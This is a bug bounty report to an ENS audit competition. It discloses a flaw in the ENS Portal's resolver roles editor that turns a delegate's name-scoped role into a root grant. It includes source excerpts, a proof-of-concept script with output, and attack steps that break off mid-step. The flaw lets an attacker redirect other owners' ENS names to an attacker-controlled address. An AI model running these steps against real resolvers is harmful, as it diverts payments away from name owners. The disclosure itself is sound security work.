# 93030 w a critical broken scope derivation in the portal resolver roles editor leads to resolving ens names to an attacker controlled address

**Submitted on Sep 14th 2026 at 01:29:08 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93030
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The Portal's resolver roles editor decides which name a delegate's role applies to by checking whether that name is still pointed at the resolver right now, not by reading the role itself. A shared resolver is the normal ENS pattern: several owners point their names at the same resolver and one admin manages delegates on it through the Portal. When a delegate moves their own name off that resolver, an ordinary, permissionless action on a name they own, their role row survives in the indexer but the editor can no longer place it, and treats the missing scope as ROOT. The next time the admin ticks one more permission box for that delegate, meaning to extend an already-limited grant, the app grants it at the resolver's root instead of at the delegate's name. The delegate then holds write authority over every other name that resolver serves, including names they have never touched, and can rewrite any of their address records. Anyone who pays one of those names afterward pays the delegate.

## Vulnerability Details

The roles editor keeps two separate pictures of a delegate's role: the permission bits, decoded unconditionally, and the scope, derived on every render.

`resolverRoles.ts:147-160` builds a lookup from resource hash to name using only the resolver's current node list (`ResolverDetail.nodes`, the reverse of `Domain.resolver`, i.e. names presently pointed at the resolver). A name that has left is not in it.

`resolverRoles.ts:196-204` looks up each role's resource in that map inside `groupRolesByAccount`. The role's bits (`decodedRoles`) are kept unconditionally; the resolved name (`resolvedNames`) is added only on a hit. A role whose name has left keeps its ticked checkboxes and loses its scope.

`ResolverRolesSidebar.tsx:169` collapses whatever scope remains into one string: `resolvedNames.find(n => n !== '(root)') ?? ''`. Once `resolvedNames` is empty, this is `''`. That string is fed straight into the write path at `:213,299,318` (`name: roleName`), and `grantResolverRoles.ts:45-61` treats `name === ''` as an explicit request for `ROOT_RESOURCE`: `scope: 'root'`. ensjs's `grantResolverRolesWriteParameters` (`@ensdomains/ensjs/wallet/v2`) maps `scope: 'root'` to the resolver's own `grantRootRoles(uint256,address)`, a two-argument call that carries no resource or name. `rolesToPermissions.ts:66-105` (`computeRoleChanges`) still only grants the box the admin newly ticked, so what lands at root is exactly that one new permission, on top of whatever the delegate already held.

Every place this miss would otherwise be visible to a user is suppressed by the same code path. `ResolverRolesSidebar.tsx:391` renders the scope line only when `resolvedNames.length > 0`; on a departed role that array is empty, so nothing renders. The transaction the admin signs is titled `Update roles for ${account}` (`:343-348`), never a name or a scope, and there is no confirmation dialog for a save, only for remove.

A root grant covers every name the resolver serves, and the app treats it that way everywhere else: the Add-User sheet offers root as its own explicit choice, labeled "Root (all nodes)", and names it in the transaction (`ResolverAddUserSheet.tsx:252-258,321`), and `grantResolverRoles.ts:20` documents `''` as "ROOT\_RESOURCE (all names)". The roles sidebar produces that same `''` when it has only failed to find a name. The Portal's own edit-records permission check (`useCanEditRecords.ts:75-87,108-117`) then passes for the delegate on every other name the resolver serves, so `canEdit` flips to true and the app opens those names' edit-records pages to them. Nothing in that path checks ownership.

The data the app reads here is correct. A delegate's role is still held on the resolver after their name leaves it, and the indexer keeps listing it (`poc-evidence/reads.json`, R1: the name left the resolver's `nodes`, the role stayed in `roles`). ENS's hosted indexer reports that role with its full resource: a live query against `staging-graphql.ens.dev` for the resolver serving `batas.eth` returned the delegate role for `counterparty.batas.eth` intact, and the app's own lookup, run on that response, resolves it to that name. The wrong value appears only inside the Portal, at the moment it looks that correct role up in a list of names that no longer contains it.

This was proven end to end on an anvil fork of Sepolia running the real, deployed, pinned resolver implementation (`0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`), with the Portal driven in a browser (`poc-evidence/`). `poc.mjs` below reproduces the same collapse through the app's own unmodified code.

### Vulnerable source code

**1. Scope map built only from the resolver's current node list** @ `apps/portal/src/lib/roles/resolverRoles.ts:147-160`

```ts
export const buildResourceToNameMap = (
  nodes: readonly { readonly name: string }[],
): Map<string, string> => {
  const map = new Map<string, string>()
  map.set(ROOT_RESOURCE, '(root)')
  for (const node of nodes) {
    if (node.name) {
      map.set(computeNameResource(node.name).toLowerCase(), node.name)
    }
  }
  return map
}
```

**2. A role keeps its bits when the map misses, and loses only its scope** @ `apps/portal/src/lib/roles/resolverRoles.ts:196-204`

```ts
const decoded = decodeResolverRoleBitmap(role.roleBitmap)
const resolvedName = resourceToName?.get(resource) ?? null
...
existing.decodedRoles.push(...decoded)
if (resolvedName) existing.resolvedNames.add(resolvedName)
```

**3. The lost scope becomes the root sentinel** @ `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:169`

```ts
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

**4. The sentinel is read as a request for ROOT\_RESOURCE, not a fallback name** @ `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-61`

```ts
const writeParams = grantResolverRolesWriteParameters(
  walletClient as Parameters<typeof grantResolverRolesWriteParameters>[0],
  name === ''
    ? { resolverAddress, targetAccount: account, scope: 'root', roles }
    : { resolverAddress, targetAccount: account, scope: 'name', name, roles },
)
```

**5. The scope line only renders when it resolved** @ `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:391-396`

```tsx
{selectedAccount && resolvedNames.length > 0 && (
  <p className="text-sm text-muted-foreground">
    {resolvedNames.includes('(root)')
      ? 'Global roles (all names)'
      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
  </p>
)}
```

**6. A root grant opens every other name's edit-records page** @ `apps/portal/src/features/records/hooks/useCanEditRecords.ts:75-87,108-117`

```ts
const roleQueries = useQueries({
  queries: roles.map((role) => ({
    ...getHasRolesQueryOptions({
      resolverAddress, resource: nameResource, roles: [role], account: connectedAddress,
    }),
  })),
})
...
const canEdit = (() => {
  if (!enabled || !connectedAddress || isLoading || !resolverAddress) return false
  if (isPermissioned) return hasResolverRole
  return isOwner
})()
```

## Impact Details

* **The program's own Critical row, met exactly:** *"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves."* The Portal causes this end to end. Its roles editor sends the root grant the admin never chose, and its own edit-records page then opens `victim.eth` to the attacker and sends the address change when they click Save. `victim.eth`'s ETH address record went from the victim's address to the attacker's (read back through the UniversalResolver), and the app's `/victim.eth/records` page now gives the attacker's address as that name's address. Every future payment to that name reaches the attacker.
* **Every step is permissionless.** The attacker only needs to own a name on a shared resolver and hold a name-scoped delegate role on it, an ordinary "manage your own name" grant, then call `setResolver` on their own name. Co-tenancy is organic: a live census of the 135 resolvers on this exact pinned implementation found 10 serving 2 or more distinct owners, and one of them, the resolver serving `batas.eth`, is a complete attacker setup where the co-tenant delegate already owns the name their role is scoped to.
* **The victim has no reason to look and no way to see it happen.** The victim never interacts with the resolver, the roles editor, or the admin. The scope line the admin would need to notice is not rendered (source block 5), and the transaction the admin signs names only an address (source block, `ResolverRolesSidebar.tsx:343-348`).
* **It survives an attempt to remove it from this screen.** Once the attacker points their own name back at the resolver, `resolvedNames` becomes non-empty again and Remove/revoke takes the `scope: 'name'` branch (`ResolverRolesSidebar.tsx:318`), which revokes the name-scoped bits, not the root grant made while the row was blank. The root grant is not removable from this screen.
* **High floor, if the terminal redirect is not credited:** *"Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email."* The admin's single Save writes a permission that reaches every other name the resolver serves, with one click and no scope shown.

## References

**The map miss**

* `apps/portal/src/lib/roles/resolverRoles.ts:147-160` - `buildResourceToNameMap`, built from the current node list only
* `apps/portal/src/lib/roles/resolverRoles.ts:179-221` - `groupRolesByAccount`, keeps bits unconditionally, scope only on a hit

**The collapse to root**

* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:167-169` - `roleName = resolvedNames.find((n) => n !== '(root)') ?? ''`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:190-193,295-303,315-323` - `computeRoleChanges`, and `roleName` fed into both save and remove
* `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-61` - `name === ''` mapped to `scope: 'root'`
* `apps/portal/src/lib/roles/rolesToPermissions.ts:66-105` - `computeRoleChanges`, grants only the newly-ticked box

**Nothing discloses it**

* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:391-396` - scope line, rendered only on a hit
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:339-349` - transaction name is the address only
* Contrast, same repo: `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:252-258,321` - the Add-User path labels a root grant "Root (all nodes)" and puts it in the transaction name

**The terminal step**

* `apps/portal/src/features/records/hooks/useCanEditRecords.ts:75-87,108-117` - edit-records permission check, passes for a root-role holder on every name the resolver serves

## Proof of Concept

## Proof of Concept

04b-tx-info-update-roles.png: The admin's signing screen only says "Update roles for 0x7099…". It names no domain and doesn't say "root" or "all names", so the admin can't tell they're handing over every name on the resolver.

05a-attacker-denied-before.png: Before the admin saves, the attacker's wallet opens the victim's edit page and gets "Permission Denied". This proves the attacker had no access to begin with.

05-attacker-edits-victim.png: After the save, the same wallet on the same page can edit. The victim's address (0x3C44…) is there with the attacker's address (0x7099…) added as a pending change, next to a "Save 1 change" button. The app itself opened the victim's name to the attacker.

06-victim-resolves-to-attacker.png: The result. The victim's name now shows the attacker's address as its ETH address, so anyone who pays that name pays the attacker. If the triager looks at only one screenshot, it should be this one.

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: apps/portal derives a resolver role's scope from the resolver's
// current node list, not the role. When a delegate's own name leaves that
// list, the role row survives in the indexer but the app can no longer map
// it, collapses the scope to the empty string, and grants the next box the
// admin ticks for that row at ROOT instead of at the name. A root grant is
// ORed into every resource the resolver serves.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes its helpers to a temp dir, installs
// pinned deps there, and re-execs itself. No wallet, no RPC needed to run
// this script.
//
// LAYER A: accounts, names, resource hashes and calldata captured from an
// already-executed attack on an anvil Sepolia fork of the pinned
// PermissionedResolverImpl (0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e), a
// panoptes indexer and the Portal app in a browser, 2026-09-14
// (poc-evidence/reads.json, poc-evidence/RESULT.md, poc-evidence/
// root-widening-poc.spec.ts). This script re-derives the same defect from
// that run's data through the repo's own code; it does not repeat the
// browser run.
//
// LAYER B: apps/portal's own resolverRoles.ts and rolesToPermissions.ts,
// loaded unmodified out of the checkout, fed Layer A's data with the full,
// correct resource hash (the harness's local indexer masked its low 4
// bytes; Layer B uses the value the pinned resolver contract returns).

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-root-widening')

// ---------------------------------------------------------------- cast (Layer A, real run)
const ADMIN = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
const ATTACKER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'
const VICTIM = '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC'
const R = '0x89bB16Cd4c9fe0375c3e2239905C3E74f6E55aa6' // shared PermissionedResolver, pinned impl
const PINNED_IMPL = '0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e'
const EIP1967_SLOT_VALUE = '0x0000000000000000000000009eae5c2730a7dd16bdd1dee6421a1b91e3b0365e'
const VICTIM_NAME = 'victim-1789333890807.eth'
const MALLORY_NAME = 'mallory-1789333891576.eth'
const MALLORY_RESOURCE_FULL = '0x1b194cff065faca5ece71c293b445aa880f4903fc99f9fa0a76fab3c02011daa'
const VICTIM_RESOURCE = '0x4155018aefcffba7801d931927a1d627624cfab927dd2e0171483d270f47f1bb'
const ATTACKER_ROLE_BITMAP = '0x10' // ROLE_SET_TEXT, the role granted before this PoC's attack
// The real signed transaction, mined during the run above (poc-evidence/reads.json, R3):
const REAL_TX = {
  hash: '0xd8969b3a1ef3a5ec1619684e97bf61d65eb0ad7fafc800b19ac9f73a09791309',
  to: R,
  from: ADMIN,
  selector: '0x072d5d77',
  functionName: 'grantRootRoles',
  args: ['0x1', ATTACKER],
}
// Real reads taken through the same fork, before and after REAL_TX mined (reads.json, R2/R4/R5):
const REAL_READS = {
  hasRootRoles_SET_ADDR_before: false,
  hasRoles_victimResource_SET_ADDR_before: false,
  hasRootRoles_SET_ADDR_after: true,
  hasRoles_victimResource_SET_ADDR_after: true,
  addr_victim_60_before: VICTIM,
  addr_victim_60_after: ATTACKER,
  victimTokenOwner: VICTIM,
}

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-root-widening",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs-abi": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

// Lets the repo's own source run unmodified against these pinned deps,
// without installing the pnpm monorepo and without editing a line of target.
const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

// path.relative is WRONG across drives on Windows (G: vs C:); it returns an
// absolute path, which would make every node_modules file count as a repo file.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  // repo files resolve bare imports (viem) against THIS PoC's own pinned
  // node_modules, so both sides share one module instance.
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: a departed delegate\'s resolver role collapses to ROOT,')
  console.log('           and a root role redirects a name the attacker never owned')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'apps', 'portal'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs-abi @e96662c, tsx)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A + B imports

const { buildResourceToNameMap, groupRolesByAccount, decodeResolverRoleBitmap, computeNameResource } =
  await import('@ens-repo/apps/portal/src/lib/roles/resolverRoles.ts')
const { computeRoleChanges, roleToPermissions } =
  await import('@ens-repo/apps/portal/src/lib/roles/rolesToPermissions.ts')
const { permissionedResolverGrantRootRolesSnippet } =
  await import('@ensdomains/ensjs-abi/v2/permissionedResolver')
const { decodeFunctionData, encodeFunctionData, getAddress, toFunctionSelector } = await import('viem')

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(34)} ${v}`)

act('ACT 1', 'The real run this PoC re-derives (poc-evidence/, 2026-09-14)')
kv('shared resolver R', R)
kv('EIP-1967 impl slot of R', `${EIP1967_SLOT_VALUE.slice(26)} == pinned ${PINNED_IMPL.toLowerCase()}`)
if (`0x${EIP1967_SLOT_VALUE.slice(26)}`.toLowerCase() !== PINNED_IMPL.toLowerCase())
  throw new Error('R is not on the pinned PermissionedResolverImpl')
kv('admin (resolver root ALL_ROLES)', ADMIN)
kv('attacker / delegate', ATTACKER)
kv('victim (owns victim.eth, never sold or touched it)', VICTIM)
kv(`${MALLORY_NAME} (attacker's own name)`, 'resolver = R at registration')
kv(`${VICTIM_NAME} (victim's own name)`, 'resolver = R, addr(60) = victim')
say()
say('  Before this PoC: the admin granted the attacker ROLE_SET_TEXT scoped to')
say(`  ${MALLORY_NAME} only, an ordinary "manage your own name" delegation.`)

act('ACT 2', "Layer B: the app's own computeNameResource matches the real on-chain resource")
const derivedMalloryResource = computeNameResource(MALLORY_NAME)
kv('computeNameResource(mallory name)', derivedMalloryResource)
kv('on-chain resource (verified live, hasRoles=true)', MALLORY_RESOURCE_FULL)
if (derivedMalloryResource.toLowerCase() !== MALLORY_RESOURCE_FULL.toLowerCase())
  throw new Error('resource formula mismatch: premise broken')
say('  >> resolverRoles.ts:138-141, loaded unmodified, reproduces the exact')
say('     resource the pinned resolver contract computes for this role.')

act('ACT 3', "Layer B: buildResourceToNameMap + groupRolesByAccount, the app's own scope lookup")
const attackerRole = { account: ATTACKER, resource: derivedMalloryResource, roleBitmap: ATTACKER_ROLE_BITMAP }
const nodesBefore = [{ name: MALLORY_NAME }, { name: VICTIM_NAME }] // mallory.eth still on R
const nodesAfter = [{ name: VICTIM_NAME }] // attacker moved mallory.eth to another resolver
const mapBefore = buildResourceToNameMap(nodesBefore)
const mapAfter = buildResourceToNameMap(nodesAfter)
const groupedBefore = groupRolesByAccount([attackerRole], mapBefore)[0]
const groupedAfter = groupRolesByAccount([attackerRole], mapAfter)[0]
kv('decoded role bits (either state)', decodeResolverRoleBitmap(ATTACKER_ROLE_BITMAP).join(', '))
say()
say(`  BEFORE departure, nodes = [${MALLORY_NAME}, ${VICTIM_NAME}]:`)
kv('  resolvedNames', JSON.stringify(groupedBefore.resolvedNames))
say(`  AFTER departure (attacker's own setResolver on ${MALLORY_NAME}), nodes = [${VICTIM_NAME}]:`)
kv('  resolvedNames', JSON.stringify(groupedAfter.resolvedNames))
if (groupedBefore.resolvedNames.length !== 1 || groupedBefore.resolvedNames[0] !== MALLORY_NAME)
  throw new Error('positive control failed: the role should resolve before departure')
if (groupedAfter.resolvedNames.length !== 0)
  throw new Error('negative control failed: the role should NOT resolve after departure')
say()
say('  >> Same role, same account, same resource. The only thing that changed')
say('     is whose name is still in nodes[]. This is the app map-building')
say('     function itself (resolverRoles.ts:147-160, 179-221), fed the real,')
say("     unmasked on-chain resource, not the local run's indexer artifact.")

act('ACT 4', 'ResolverRolesSidebar.tsx:169, applied to the AFTER state')
const roleName = groupedAfter.resolvedNames.find((n) => n !== '(root)') ?? ''
kv("roleName = resolvedNames.find(n => n !== '(root)') ?? ''", JSON.stringify(roleName))
if (roleName !== '') throw new Error('expected the empty-string root sentinel')
say('  >> Every scope this row had is gone. grantResolverRoles.ts:47-60 treats')
say("     name === '' as scope:'root', and ensjs maps scope:'root' to")
say('     grantRootRoles (grantResolverRoles.ts:45-61, ensjs wallet/v2 source).')

act('ACT 5', "Layer B: rolesToPermissions.ts computeRoleChanges, the admin ticking one new box")
const original = decodeResolverRoleBitmap(ATTACKER_ROLE_BITMAP) // ['ROLE_SET_TEXT']
const edited = roleToPermissions([...original, 'ROLE_SET_ADDR']) // admin ticks "Set Address"
const { rolesToGrant } = computeRoleChanges(original, edited)
kv('original roles (already ticked, unchanged)', original.join(', '))
kv('admin ticks', 'ROLE_SET_ADDR ("Set Address")')
kv('rolesToGrant', JSON.stringify(rolesToGrant))
if (rolesToGrant.length !== 1 || rolesToGrant[0] !== 'ROLE_SET_ADDR')
  throw new Error('expected exactly ROLE_SET_ADDR as the delta')
say('  >> The delta is exactly the newly-ticked box. Combined with ACT 4, this')
say("     delta is granted with name:'' -> at ROOT, not at mallory.eth.")

act('ACT 6', "The resolver's own grantRootRoles selector matches the real signed transaction")
const abiSelector = toFunctionSelector(
  permissionedResolverGrantRootRolesSnippet.find((f) => f.name === 'grantRootRoles'),
)
kv('selector, from the resolver ABI the app/tests use', abiSelector)
kv('selector on the real mined transaction', REAL_TX.selector)
if (abiSelector.toLowerCase() !== REAL_TX.selector.toLowerCase())
  throw new Error('ABI selector does not match the real transaction')
const roundtrip = encodeFunctionData({
  abi: permissionedResolverGrantRootRolesSnippet,
  functionName: 'grantRootRoles',
  args: [1n, getAddress(ATTACKER)], // ROLE_SET_ADDR = 1n << 0n
})
const decoded = decodeFunctionData({ abi: permissionedResolverGrantRootRolesSnippet, data: roundtrip })
kv('re-encoded call: function', decoded.functionName)
kv('re-encoded call: args', JSON.stringify(decoded.args.map((a) => (typeof a === 'bigint' ? `0x${a.toString(16)}` : a))))
if (decoded.functionName !== REAL_TX.functionName) throw new Error('function name mismatch')
if (`0x${decoded.args[0].toString(16)}` !== REAL_TX.args[0]) throw new Error('roles arg mismatch')
if (getAddress(decoded.args[1]) !== getAddress(REAL_TX.args[1])) throw new Error('account arg mismatch')
say()
say(`  >> The transaction the admin's browser actually signed and the network`)
say(`     mined (tx ${REAL_TX.hash.slice(0, 14)}...) is grantRootRoles(0x1, attacker),`)
say('     byte for byte what ACT 4 + ACT 5 predict from the app\'s own code.')

act('ACT 7', 'The real reads: root ORs into a name the attacker never held any role on')
kv('hasRootRoles(R, SET_ADDR, attacker) before', REAL_READS.hasRootRoles_SET_ADDR_before)
kv('hasRootRoles(R, SET_ADDR, attacker) after', REAL_READS.hasRootRoles_SET_ADDR_after)
kv(`hasRoles(R, resource(${VICTIM_NAME}), SET_ADDR, attacker) before`, REAL_READS.hasRoles_victimResource_SET_ADDR_before)
kv(`hasRoles(R, resource(${VICTIM_NAME}), SET_ADDR, attacker) after`, REAL_READS.hasRoles_victimResource_SET_ADDR_after)
if (!REAL_READS.hasRoles_victimResource_SET_ADDR_after)
  throw new Error('root grant did not reach the victim resource')
say()
say('  >> EnhancedAccessControl.sol:453-455, _effectiveRoles = root OR resource.')
say(`     The attacker held no role of any kind on ${VICTIM_NAME}. The grant`)
say('     from ACT 6 is the only thing that put them there.')

act('ACT 8', "The impact: victim.eth's address record, before and after")
say('    field                    before                                        after')
say(`    ${'-'.repeat(74)}`)
say(`    addr(${VICTIM_NAME.padEnd(20)}, 60)  ${REAL_READS.addr_victim_60_before}  ${REAL_READS.addr_victim_60_after}`)
say(`    token owner              ${REAL_READS.victimTokenOwner}   ${REAL_READS.victimTokenOwner}  (unchanged)`)
if (getAddress(REAL_READS.addr_victim_60_after) !== getAddress(ATTACKER))
  throw new Error('final ledger check failed: victim.eth does not resolve to the attacker')
if (getAddress(REAL_READS.victimTokenOwner) !== getAddress(VICTIM))
  throw new Error('final ledger check failed: victim.eth ownership moved')
say()
say(`  >> Every payment sent to ${VICTIM_NAME} now reaches the attacker.`)
say('     The victim still owns the name and was never asked.')

say()
rule()
say('  PoC PASSED, every assertion held.')
rule()
```

### Output

```
==============================================================================
  ENS PoC: a departed delegate's resolver role collapses to ROOT,
           and a root role redirects a name the attacker never owned
  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-root-widening
==============================================================================

==============================================================================
  ACT 1  The real run this PoC re-derives (poc-evidence/, 2026-09-14)
==============================================================================
    shared resolver R                  0x89bB16Cd4c9fe0375c3e2239905C3E74f6E55aa6
    EIP-1967 impl slot of R            9eae5c2730a7dd16bdd1dee6421a1b91e3b0365e == pinned 0x9eae5c2730a7dd16bdd1dee6421a1b91e3b0365e
    admin (resolver root ALL_ROLES)    0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    attacker / delegate                0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    victim (owns victim.eth, never sold or touched it) 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
    mallory-1789333891576.eth (attacker's own name) resolver = R at registration
    victim-1789333890807.eth (victim's own name) resolver = R, addr(60) = victim

  Before this PoC: the admin granted the attacker ROLE_SET_TEXT scoped to
  mallory-1789333891576.eth only, an ordinary "manage your own name" delegation.

==============================================================================
  ACT 2  Layer B: the app's own computeNameResource matches the real on-chain resource
==============================================================================
    computeNameResource(mallory name)  0x1b194cff065faca5ece71c293b445aa880f4903fc99f9fa0a76fab3c02011daa
    on-chain resource (verified live, hasRoles=true) 0x1b194cff065faca5ece71c293b445aa880f4903fc99f9fa0a76fab3c02011daa
  >> resolverRoles.ts:138-141, loaded unmodified, reproduces the exact
     resource the pinned resolver contract computes for this role.

==============================================================================
  ACT 3  Layer B: buildResourceToNameMap + groupRolesByAccount, the app's own scope lookup
==============================================================================
    decoded role bits (either state)   ROLE_SET_TEXT

  BEFORE departure, nodes = [mallory-1789333891576.eth, victim-1789333890807.eth]:
      resolvedNames                    ["mallory-1789333891576.eth"]
  AFTER departure (attacker's own setResolver on mallory-1789333891576.eth), nodes = [victim-1789333890807.eth]:
      resolvedNames                    []

  >> Same role, same account, same resource. The only thing that changed
     is whose name is still in nodes[]. This is the app map-building
     function itself (resolverRoles.ts:147-160, 179-221), fed the real,
     unmasked on-chain resource, not the local run's indexer artifact.

==============================================================================
  ACT 4  ResolverRolesSidebar.tsx:169, applied to the AFTER state
==============================================================================
    roleName = resolvedNames.find(n => n !== '(root)') ?? '' ""
  >> Every scope this row had is gone. grantResolverRoles.ts:47-60 treats
     name === '' as scope:'root', and ensjs maps scope:'root' to
     grantRootRoles (grantResolverRoles.ts:45-61, ensjs wallet/v2 source).

==============================================================================
  ACT 5  Layer B: rolesToPermissions.ts computeRoleChanges, the admin ticking one new box
==============================================================================
    original roles (already ticked, unchanged) ROLE_SET_TEXT
    admin ticks                        ROLE_SET_ADDR ("Set Address")
    rolesToGrant                       ["ROLE_SET_ADDR"]
  >> The delta is exactly the newly-ticked box. Combined with ACT 4, this
     delta is granted with name:'' -> at ROOT, not at mallory.eth.

==============================================================================
  ACT 6  The resolver's own grantRootRoles selector matches the real signed transaction
==============================================================================
    selector, from the resolver ABI the app/tests use 0x072d5d77
    selector on the real mined transaction 0x072d5d77
    re-encoded call: function          grantRootRoles
    re-encoded call: args              ["0x1","0x70997970C51812dc3A010C7d01b50e0d17dc79C8"]

  >> The transaction the admin's browser actually signed and the network
     mined (tx 0xd8969b3a1ef3...) is grantRootRoles(0x1, attacker),
     byte for byte what ACT 4 + ACT 5 predict from the app's own code.

==============================================================================
  ACT 7  The real reads: root ORs into a name the attacker never held any role on
==============================================================================
    hasRootRoles(R, SET_ADDR, attacker) before false
    hasRootRoles(R, SET_ADDR, attacker) after true
    hasRoles(R, resource(victim-1789333890807.eth), SET_ADDR, attacker) before false
    hasRoles(R, resource(victim-1789333890807.eth), SET_ADDR, attacker) after true

  >> EnhancedAccessControl.sol:453-455, _effectiveRoles = root OR resource.
     The attacker held no role of any kind on victim-1789333890807.eth. The grant
     from ACT 6 is the only thing that put them there.

==============================================================================
  ACT 8  The impact: victim.eth's address record, before and after
==============================================================================
    field                    before                                        after
    --------------------------------------------------------------------------
    addr(victim-1789333890807.eth, 60)  0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC  0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    token owner              0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC   0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC  (unchanged)

  >> Every payment sent to victim-1789333890807.eth now reaches the attacker.
     The victim still owns the name and was never asked.

==============================================================================
  PoC PASSED, every assertion held.
==============================================================================
```

The attacker's account ends the run holding root `ROLE_SET_ADDR` on a resolver they never administered, and `victim.eth`'s ETH address record ends the run pointing at the attacker instead of the victim, exit code 0.

## Attack code

```
// 1. Admin's resolver R serves several owners' names, the normal ENS pattern.
//    Admin grants the attacker a name-scoped delegate role on the attacker's
//    OWN name, an ordinary "manage your own name" delegation:
authorizeNameRoles(dnsEncode("mallory.eth"), ROLE_SET_TEXT, attacker, true)
```

```
// 2. Permissionless, on a name the attacker owns. No admin, no victim involved.
setResolver(namehash("mallory.eth"), anyOtherResolver)
// mallory.eth leaves R.nodes[]; the attacker's role row survives in R's own
// EAC storage, now unmappable by the roles editor (Vulnerability Details).
```

```
// 3. The admin, believing they are handing the same delegate one more
//    ordinary permission, ticks "Set Address" in the roles editor and Saves.
//    The app emits, on R:
grantRootRoles(ROLE_SET_ADDR, attacker)
```

```
// 4. The attacker opens victim.eth/edit-records, a name they have never
//    touched, and the form now renders (useCanEditRecords.ts, source block 6):
